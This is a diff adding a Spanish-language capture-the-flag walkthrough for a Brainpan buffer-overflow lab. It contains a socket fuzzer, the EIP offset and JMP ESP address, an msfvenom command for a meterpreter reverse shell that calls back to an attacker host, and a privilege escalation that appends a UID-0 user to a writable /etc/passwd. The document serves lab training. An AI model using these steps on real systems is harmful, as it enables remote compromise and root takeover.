@@ -17,6 +17,26 @@
 
 ### Task 1: No se requiere respuesta
 
+**Explicación:** La sala es un ejercicio guiado en el que el progreso se mide por el nivel de acceso conseguido (no por flags). El recorrido completo es: escaneo (`9999` = servicio `abyss`/Brainpan que pide contraseña, y `10000` = SimpleHTTPServer Python 2.7.3), enumeración web descargando `brainpan.exe` desde `/bin`, fuzzing del puerto 9999 (crash a ~600 bytes, entre 500 y 600), cálculo del offset de EIP con un patrón cíclico (`524` bytes), y control de flujo saltando a `0x311712f3` (`!mona jmp esp` sobre brainpan.exe) con una shellcode generada con msfvenom (badchar `\x00`, con NOP-sled).
+
+```python
+# fuzzer: encontrar el crash
+import socket
+for i in range(100, 1000, 100):
+    s = socket.create_connection(("<IP>", 9999))
+    s.recv(1024); s.send(b"A" * i); s.close()
+# offset de EIP (patrón cíclico) = 524
+# shellcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00" -f python
+```
+
+El exploit final devuelve una sesión como el usuario `puck`. Con la shell hay que comprobar `/etc/passwd`: al ser escritible por el usuario, basta con añadir una línea de un usuario con UID 0 y un hash conocido (p. ej. `openssl passwd -1`), guardarla y hacer `su` para acceder a root.
+
+```text
+echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd
+su hacker
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | No answer needed | `No answer needed` |
